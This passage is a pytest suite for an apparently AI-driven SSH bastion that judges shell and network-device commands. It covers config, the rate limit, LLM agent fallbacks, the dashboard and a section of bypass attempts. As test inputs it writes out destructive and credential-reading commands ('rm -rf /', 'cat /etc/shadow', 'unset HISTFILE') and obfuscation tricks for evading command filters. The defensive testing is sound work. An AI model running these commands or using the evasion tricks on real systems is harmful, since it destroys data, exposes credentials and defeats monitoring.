    def test_max_severity(self):
        v = FinalVerdict(verdict=Verdict.DENY, decisions=[
            AgentDecision(agent_name="a", verdict=Verdict.DENY, confidence=1.0, severity=Severity.HIGH, reason=""),
            AgentDecision(agent_name="b", verdict=Verdict.DENY, confidence=1.0, severity=Severity.CRITICAL, reason=""),
        ])
        assert _max_severity(v) == "critical"

    def test_html_escape(self):
        assert _escape_html('<script>alert("xss")</script>') == '&lt;script&gt;alert("xss")&lt;/script&gt;'

    def test_notify_allow_skipped(self):
        ae = AlertEngine(AlertsConfig())
        v = FinalVerdict(verdict=Verdict.ALLOW, decisions=[])
        ae.notify(SessionContext(), "ls", v)  # should not raise


# ═══════════════════════════════════════════════════════════════════
# H. Config — edge cases
# ═══════════════════════════════════════════════════════════════════

class TestConfig:
    def test_build_dataclass_none(self):
        result = _build_dataclass(LLMConfig, None)
        assert result.provider == "openai"

    def test_build_dataclass_extra_keys(self):
        result = _build_dataclass(LLMConfig, {"provider": "ollama", "unknown_field": "ignored"})
        assert result.provider == "ollama"

    def test_load_config_real(self):
        cfg = load_config("config.yaml")
        assert len(cfg.rules.blacklist) > 30
        assert len(cfg.rules.escalation_rules) > 50
        assert len(cfg.rules.whitelist) > 10
        assert len(cfg.rules.sensitive_paths) > 10
        assert "dev" in cfg.rbac.roles
        assert "ops" in cfg.rbac.roles

    def test_resolve_api_key_env(self):
        c = LLMConfig(api_key="")
        with patch.dict(os.environ, {"OPENAI_API_KEY": "test-key"}):
            assert c.resolve_api_key() == "test-key"

    def test_resolve_base_url_none(self):
        c = LLMConfig(base_url="")
        assert c.resolve_base_url() is None

    def test_resolve_base_url_set(self):
        c = LLMConfig(base_url="http://localhost:11434/v1")
        assert c.resolve_base_url() == "http://localhost:11434/v1"


# ═══════════════════════════════════════════════════════════════════
# I. Models — SessionContext, enums
# ═══════════════════════════════════════════════════════════════════

class TestModels:
    def test_session_id_unique(self):
        s1 = SessionContext()
        s2 = SessionContext()
        assert s1.session_id != s2.session_id

    def test_add_command(self):
        s = SessionContext()
        s.add_command("ls", Verdict.ALLOW)
        assert len(s.commands) == 1
        assert s.commands[0].verdict == Verdict.ALLOW

    def test_recent_commands(self):
        s = SessionContext()
        for i in range(30):
            s.add_command(f"cmd{i}")
        assert len(s.recent_commands(10)) == 10
        assert s.recent_commands(10)[-1].command == "cmd29"

    def test_command_history_text_pending(self):
        s = SessionContext()
        s.add_command("mystery")
        text = s.command_history_text()
        assert "[pending] mystery" in text

    def test_verdict_enum(self):
        assert Verdict("allow") == Verdict.ALLOW
        assert Verdict("deny") == Verdict.DENY
        assert Verdict("escalate") == Verdict.ESCALATE

    def test_severity_enum(self):
        assert Severity("critical") == Severity.CRITICAL

    def test_category_all_values(self):
        expected = {"safe", "risky", "destructive", "recon", "exfil", "privesc", "config_change", "unknown"}
        assert {c.value for c in CommandCategory} == expected


# ═══════════════════════════════════════════════════════════════════
# J. Engine — script path extraction, binary detection, shell quote
# ═══════════════════════════════════════════════════════════════════

class TestEngineHelpers:
    def test_extract_interpreter(self):
        assert _extract_script_path("bash /tmp/evil.sh") == "/tmp/evil.sh"
        assert _extract_script_path("python3 /opt/script.py") == "/opt/script.py"
        assert _extract_script_path("sudo python /tmp/x.py") == "/tmp/x.py"

    def test_extract_direct_exec(self):
        assert _extract_script_path("./malware") == "./malware"
        assert _extract_script_path("/tmp/backdoor") == "/tmp/backdoor"

    def test_extract_source(self):
        assert _extract_script_path("source /tmp/env.sh") == "/tmp/env.sh"
        assert _extract_script_path(". /tmp/env.sh") == "/tmp/env.sh"

    def test_extract_system_dir_ignored(self):
        assert _extract_script_path("/usr/bin/ls") is None

    def test_extract_non_script(self):
        assert _extract_script_path("ls -la") is None
        assert _extract_script_path("cat /etc/hostname") is None

    def test_is_binary_true(self):
        assert _is_binary(b"\x7fELF\x00\x01\x02") is True

    def test_is_binary_false(self):
        assert _is_binary(b"#!/bin/bash\necho hello") is False

    def test_shell_quote(self):
        assert _shell_quote("/tmp/test") == "'/tmp/test'"
        assert "\\'" in _shell_quote("/tmp/it's a test")


# ═══════════════════════════════════════════════════════════════════
# K. Engine — full pipeline with mocked LLM
# ═══════════════════════════════════════════════════════════════════

class TestEnginePipeline:
    @patch("ai_defense.core.engine.LLMClient")
    def test_full_linux_pipeline(self, mock_llm_cls, tmp_path):
        from ai_defense.core.engine import AIEngine
        cfg = load_config("config.yaml")
        cfg.audit.db_path = str(tmp_path / "pipe.db")
        cfg.audit.json_log = str(tmp_path / "pipe.jsonl")
        engine = AIEngine(cfg)

        session = engine.create_session(username="admin", role="ops")

        r1 = engine.evaluate("ls -la", session)
        assert r1.verdict == Verdict.ALLOW

        r2 = engine.evaluate("rm -rf /", session)
        assert r2.verdict == Verdict.DENY

        r3 = engine.evaluate("cat /etc/shadow", session)
        assert r3.verdict == Verdict.DENY

        assert len(session.commands) == 3
        engine.end_session(session)
        engine.close()

    @patch("ai_defense.core.engine.LLMClient")
    def test_network_pipeline(self, mock_llm_cls, tmp_path):
        from ai_defense.core.engine import AIEngine
        cfg = load_config("config.yaml")
        cfg.audit.db_path = str(tmp_path / "net.db")
        cfg.audit.json_log = str(tmp_path / "net.jsonl")
        engine = AIEngine(cfg)

        session = engine.create_session(username="admin", role="ops",
                                        target_profile="cisco_ios", target_vendor="cisco_ios")
        assert engine.is_network_session(session)

        r1 = engine.evaluate("show ip route", session)
        assert r1.verdict == Verdict.ALLOW

        r2 = engine.evaluate("write erase", session)
        assert r2.verdict == Verdict.DENY

        engine.end_session(session)
        engine.close()

    @patch("ai_defense.core.engine.LLMClient")
    def test_rate_limit(self, mock_llm_cls, tmp_path):
        from ai_defense.core.engine import AIEngine, MAX_COMMANDS_PER_WINDOW
        cfg = load_config("config.yaml")
        cfg.audit.db_path = str(tmp_path / "rate.db")
        cfg.audit.json_log = str(tmp_path / "rate.jsonl")
        engine = AIEngine(cfg)

        session = engine.create_session(username="admin", role="ops")
        for _ in range(MAX_COMMANDS_PER_WINDOW):
            engine.evaluate("ls", session)

        r = engine.evaluate("ls", session)
        assert r.verdict == Verdict.DENY
        assert "лимит" in r.reason.lower() or "rate" in r.reason.lower()
        engine.close()

    @patch("ai_defense.core.engine.LLMClient")
    def test_rate_limit_cleared_on_session_end(self, mock_llm_cls, tmp_path):
        from ai_defense.core.engine import AIEngine
        cfg = load_config("config.yaml")
        cfg.audit.db_path = str(tmp_path / "rate2.db")
        cfg.audit.json_log = str(tmp_path / "rate2.jsonl")
        engine = AIEngine(cfg)

        session = engine.create_session(username="admin", role="ops")
        engine.evaluate("ls", session)
        assert session.session_id in engine._rate_buckets
        engine.end_session(session)
        assert session.session_id not in engine._rate_buckets
        engine.close()


# ═══════════════════════════════════════════════════════════════════
# L. NetworkConfigAgent — prompts
# ═══════════════════════════════════════════════════════════════════

class TestNetworkConfigAgentFull:
    def test_all_vendor_prompts(self):
        from ai_defense.agents.network_config_agent import _VENDOR_PROMPTS, _build_system_prompt
        for vendor in ["cisco_ios", "cisco_nxos", "junos", "mikrotik", "huawei_vrp", "arista_eos", "generic_network"]:
            prompt = _build_system_prompt(vendor)
            assert "JSON" in prompt
            assert "ИГНОРИРУЙ" in prompt or "prompt injection" in prompt

    def test_unknown_vendor_fallback(self):
        from ai_defense.agents.network_config_agent import _build_system_prompt
        prompt = _build_system_prompt("unknown_vendor")
        assert "Неизвестное сетевое устройство" in prompt

    def test_agent_evaluate_error_handling(self):
        from ai_defense.agents.network_config_agent import NetworkConfigAgent
        mock_llm = MagicMock()
        mock_llm.chat_json.side_effect = Exception("LLM down")
        agent = NetworkConfigAgent(mock_llm, vendor="cisco_ios")
        r = agent.evaluate("show ip route", SessionContext())
        assert r.verdict == Verdict.ESCALATE
        assert "Ошибка" in r.reason

    def test_agent_invalid_json(self):
        from ai_defense.agents.network_config_agent import NetworkConfigAgent
        mock_llm = MagicMock()
        mock_llm.chat_json.return_value = {"error": "invalid_json", "raw": "garbage"}
        agent = NetworkConfigAgent(mock_llm, vendor="cisco_ios")
        r = agent.evaluate("show ip route", SessionContext())
        assert r.verdict == Verdict.ESCALATE

    def test_agent_with_config_context(self):
        from ai_defense.agents.network_config_agent import NetworkConfigAgent
        mock_llm = MagicMock()
        mock_llm.chat_json.return_value = {
            "verdict": "allow", "category": "safe", "confidence": 0.95,
            "severity": "low", "reason": "Safe show command", "impact": "None"
        }
        agent = NetworkConfigAgent(mock_llm, vendor="cisco_ios")
        session = SessionContext(network_context="hostname R1\ninterface Gi0/0\n ip address 10.0.0.1 255.255.255.0")
        r = agent.evaluate("show ip route", session)
        assert r.verdict == Verdict.ALLOW
        assert "Воздействие" in r.reason

    def test_agent_truncates_long_config(self):
        from ai_defense.agents.network_config_agent import NetworkConfigAgent
        mock_llm = MagicMock()
        mock_llm.chat_json.return_value = {"verdict": "allow", "confidence": 0.9, "severity": "low", "reason": "ok"}
        agent = NetworkConfigAgent(mock_llm, vendor="cisco_ios")
        session = SessionContext(network_context="x" * 10000)
        agent.evaluate("show version", session)
        call_args = mock_llm.chat_json.call_args
        user_prompt = call_args[0][1]
        assert "обрезано" in user_prompt

    def test_agent_invalid_verdict_fallback(self):
        from ai_defense.agents.network_config_agent import NetworkConfigAgent
        mock_llm = MagicMock()
        mock_llm.chat_json.return_value = {
            "verdict": "INVALID", "confidence": 0.5, "severity": "BOGUS",
            "reason": "test", "category": "NONEXISTENT"
        }
        agent = NetworkConfigAgent(mock_llm, vendor="cisco_ios")
        r = agent.evaluate("configure terminal", SessionContext())
        assert r.verdict == Verdict.ESCALATE
        assert r.severity == Severity.MEDIUM
        assert r.category == CommandCategory.UNKNOWN


# ═══════════════════════════════════════════════════════════════════
# M. Dashboard
# ═══════════════════════════════════════════════════════════════════

class TestDashboardFull:
    def test_render_with_data(self, tmp_path):
        from ai_defense.web.dashboard import _render_dashboard
        logger = AuditLogger(AuditConfig(
            db_path=str(tmp_path / "d.db"), json_log=str(tmp_path / "d.jsonl")
        ))
        s = SessionContext(username="admin", role="ops", target_profile="cisco_ios", target_vendor="cisco_ios")
        logger.log_session_start(s)
        logger.log_decision(s, "show version", FinalVerdict(
            verdict=Verdict.ALLOW,
            decisions=[AgentDecision(agent_name="nre", verdict=Verdict.ALLOW, confidence=1.0, reason="safe")],
            reason="safe",
        ))
        html = _render_dashboard(logger)
        assert "cisco_ios" in html
        assert "show version" in html
        assert "Профиль" in html
        logger.close()

    def test_render_empty(self, tmp_path):
        from ai_defense.web.dashboard import _render_dashboard
        logger = AuditLogger(AuditConfig(
            db_path=str(tmp_path / "empty.db"), json_log=str(tmp_path / "empty.jsonl")
        ))
        html = _render_dashboard(logger)
        assert "Нет данных" in html
        logger.close()

    def test_create_app(self, tmp_path):
        from ai_defense.web.dashboard import create_app
        logger = AuditLogger(AuditConfig(
            db_path=str(tmp_path / "app.db"), json_log=str(tmp_path / "app.jsonl")
        ))
        app = create_app(logger)
        assert app.title == "4SSH_CONTROL Dashboard"
        logger.close()


# ═══════════════════════════════════════════════════════════════════
# N. Bastion — shell detection, profile detection, interactive progs
# ═══════════════════════════════════════════════════════════════════

class TestBastionHelpers:
    def test_detect_shell_prompt(self):
        from bastion import _detect_shell_return
        assert _detect_shell_return("user@host:~$ ") is True
        assert _detect_shell_return("[admin@host ~]$ ") is True
        assert _detect_shell_return("~/work# ") is True

    def test_detect_repl_prompt(self):
        from bastion import _detect_shell_return
        assert _detect_shell_return(">>> ") is False
        assert _detect_shell_return("mysql> ") is False
        assert _detect_shell_return("In [1]: ") is False

    def test_detect_empty(self):
        from bastion import _detect_shell_return
        assert _detect_shell_return("") is False
        assert _detect_shell_return("   ") is False

    def test_interactive_programs_match(self):
        from bastion import INTERACTIVE_PROGRAMS
        for prog in ["vim", "nano", "top", "htop", "mysql", "psql", "python3",
                      "ssh", "tmux", "screen", "less", "man", "mc", "journalctl"]:
            assert INTERACTIVE_PROGRAMS.search(prog), f"{prog} should match"

    def test_interactive_programs_no_match(self):
        from bastion import INTERACTIVE_PROGRAMS
        for cmd in ["ls", "cat", "grep", "rm", "cp", "mv", "echo"]:
            assert not INTERACTIVE_PROGRAMS.search(cmd), f"{cmd} should NOT match"

    def test_resolve_role_known_user(self):
        from bastion import _resolve_role
        mock_engine = MagicMock()
        mock_engine.cfg.rbac.users = {"admin": UserMapping(role="ops")}
        assert _resolve_role(mock_engine, "admin", "dev") == "ops"

    def test_resolve_role_unknown_user(self):
        from bastion import _resolve_role
        mock_engine = MagicMock()
        mock_engine.cfg.rbac.users = {}
        assert _resolve_role(mock_engine, "stranger", "ops") == "ops"

    def test_session_none_protection(self):
        from bastion import handle_session
        import inspect
        src = inspect.getsource(handle_session)
        assert "session = None" in src
        assert "if session is not None" in src


# ═══════════════════════════════════════════════════════════════════
# O. Bypass attempts — obfuscation techniques
# ═══════════════════════════════════════════════════════════════════

class TestBypassAttempts:
    def test_unicode_minus_bypass(self, rule_engine):
        r = rule_engine.evaluate("rm \u2212rf /")  # unicode minus
        assert r and r.verdict == Verdict.DENY

    def test_fullwidth_semicolon_bypass(self, rule_engine):
        r = rule_engine.evaluate("echo ok\uff1b rm -rf /")  # fullwidth ;
        assert r and r.verdict == Verdict.DENY

    def test_ansi_c_obfuscation(self, rule_engine):
        r = rule_engine.evaluate("$'\\x72\\x6d' -rf /")
        assert r and r.verdict == Verdict.DENY

    def test_backslash_command_name(self, rule_engine):
        r = rule_engine.evaluate("r\\m -rf /")
        assert r and r.verdict == Verdict.DENY

    def test_quoted_command_name(self, rule_engine):
        r = rule_engine.evaluate("'r'm -rf /")
        assert r and r.verdict == Verdict.DENY

    def test_path_traversal_shadow(self, rule_engine):
        r = rule_engine.evaluate("cat /tmp/../../etc/shadow")
        assert r and r.verdict == Verdict.DENY

    def test_multi_slash_shadow(self, rule_engine):
        r = rule_engine.evaluate("cat ///etc///shadow")
        assert r and r.verdict == Verdict.DENY

    def test_dot_slash_shadow(self, rule_engine):
        r = rule_engine.evaluate("cat /etc/./shadow")
        assert r and r.verdict == Verdict.DENY

    def test_rm_long_flags(self, rule_engine):
        r = rule_engine.evaluate("rm --recursive --force /")
        assert r and r.verdict == Verdict.DENY

    def test_sudo_wrapped(self, rule_engine):
        r = rule_engine.evaluate("sudo rm -rf /")
        assert r and r.verdict == Verdict.DENY

    def test_env_wrapped(self, rule_engine):
        r = rule_engine.evaluate("env rm -rf /")
        assert r and r.verdict == Verdict.DENY

    def test_chroot_wrapped(self, rule_engine):
        r = rule_engine.evaluate("chroot /mnt rm -rf /")
        assert r and r.verdict == Verdict.DENY

    def test_bash_c_wrapped(self, rule_engine):
        r = rule_engine.evaluate("bash -c 'rm -rf /'")
        assert r and r.verdict == Verdict.DENY

    def test_doas_wrapped(self, rule_engine):
        r = rule_engine.evaluate("doas rm -rf /")
        assert r and r.verdict == Verdict.DENY

    def test_timeout_wrapped(self, rule_engine):
        r = rule_engine.evaluate("timeout 10 rm -rf /")
        assert r and r.verdict == Verdict.DENY

    def test_double_sudo(self, rule_engine):
        r = rule_engine.evaluate("sudo sudo rm -rf /")
        assert r and r.verdict == Verdict.DENY

    def test_xargs_rm(self, rule_engine):
        r = rule_engine.evaluate("find / | xargs rm")
        assert r and r.verdict == Verdict.DENY

    def test_perl_oneliner(self, rule_engine):
        r = rule_engine.evaluate("perl -e 'system(\"rm -rf /\")'")
        assert r and r.verdict == Verdict.DENY

    def test_ruby_oneliner(self, rule_engine):
        r = rule_engine.evaluate("ruby -e 'system(\"id\")'")
        assert r and r.verdict == Verdict.DENY

    def test_nohup_background(self, rule_engine):
        r = rule_engine.evaluate("nohup /tmp/backdoor &")
        assert r and r.verdict == Verdict.DENY

    def test_crontab_remove(self, rule_engine):
        r = rule_engine.evaluate("crontab -r")
        assert r and r.verdict == Verdict.DENY

    def test_unset_histfile(self, rule_engine):
        r = rule_engine.evaluate("unset HISTFILE")
        assert r and r.verdict == Verdict.DENY

    def test_safe_rm_not_blocked(self, rule_engine):
        """rm without -rf and not on system dirs should pass to agents"""
        r = rule_engine.evaluate("rm /tmp/myfile.txt")
        assert r is None or r.verdict != Verdict.DENY


# ═══════════════════════════════════════════════════════════════════
# P. fetch_network_config and _fetch_via_shell
# ═══════════════════════════════════════════════════════════════════

class TestFetchNetworkConfig:
    def test_no_context_command(self):
        p = TargetProfile(context_command="")
        assert fetch_network_config(MagicMock(), p) == ""

    def test_exec_success(self):
        p = TargetProfile(context_command="show running-config", context_max_bytes=8192)
        mock = MagicMock()
        mock.exec_command.return_value = (None, MagicMock(read=MagicMock(return_value=b"hostname R1")), MagicMock())
        assert "hostname R1" in fetch_network_config(mock, p)

    def test_exec_fails_shell_fallback(self):
        p = TargetProfile(context_command="/export", context_max_bytes=8192)
        mock = MagicMock()
        mock.exec_command.side_effect = Exception("no exec")
        chan = MagicMock()
        call_count = [0]
        def fake_recv(n):
            call_count[0] += 1
            if call_count[0] == 1:
                return b"[admin@MikroTik] > "
            if call_count[0] == 2:
                return b"/export\n# RouterOS config\n/ip address\n"
            return b""
        chan.recv.side_effect = fake_recv
        ready_count = [0]
        def fake_ready():
            ready_count[0] += 1
            return ready_count[0] <= 3
        chan.recv_ready.side_effect = fake_ready
        mock.invoke_shell.return_value = chan
        result = fetch_network_config(mock, p)
        assert isinstance(result, str)


# ═══════════════════════════════════════════════════════════════════
# Q. Time policy
# ═══════════════════════════════════════════════════════════════════

class TestTimePolicy:
    def test_high_risk_time_wrapping(self):
        from ai_defense.agents.policy_enforcer import _is_high_risk_time
        tp = TimePolicy(start="22:00", end="06:00", timezone="UTC")
        # Just ensure it doesn't crash
        result = _is_high_risk_time(tp)
        assert isinstance(result, bool)

    def test_high_risk_time_invalid_tz(self):
        from ai_defense.agents.policy_enforcer import _is_high_risk_time
        tp = TimePolicy(start="22:00", end="06:00", timezone="Invalid/Timezone")
        result = _is_high_risk_time(tp)
        assert isinstance(result, bool)


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short", "-x"])
